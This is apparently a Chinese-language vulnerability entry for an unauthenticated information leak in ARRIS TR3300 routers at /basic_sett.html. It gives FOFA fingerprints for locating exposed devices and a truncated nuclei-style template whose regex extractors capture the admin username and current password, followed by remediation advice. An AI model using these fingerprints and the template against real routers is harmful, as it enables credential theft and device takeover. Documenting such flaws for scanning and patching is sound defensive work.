# arris路由器basic_sett未授权信息泄露

- **系统**：arris　|　**类型**：未授权访问　|　**CVE**：—
- **指纹**：`body="base64encode(document.tF.pws.value)"`
- **请求**：`GET /basic_sett.html HTTP/1.1`

**请求体 / payload**
```
1. Fofa
body="base64encode(document.tF.pws.value)"  body="ARRIS TR3300"
2、部分界面如下
3、隐患url,复现如下
id: arris-route-basic_sett-unauth
info:
name: arris-route-basic_sett-unauth
author: unknow
severity: high
description: arris 路由器 basic_sett 存在未授权信息泄露漏洞。
tags: arris,unauth
metadata:
fofa-qeury: body="base64encode(document.tF.pws.value)"  body="ARRIS TR3300"
http:
- raw:
-
Host:
extractors:
- type: regex
name: user
part: body
group: 1
regex:
- 'name=\"login_user\" value=\"(.*)\" disabled'
- type: regex
name: password
part: body
group: 1
regex:
- 'cur_passwd\" value=\"(.*)\"'
matchers:
- type: dsl
dsl:
…（脚本共 691 字，完整版见原文）
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。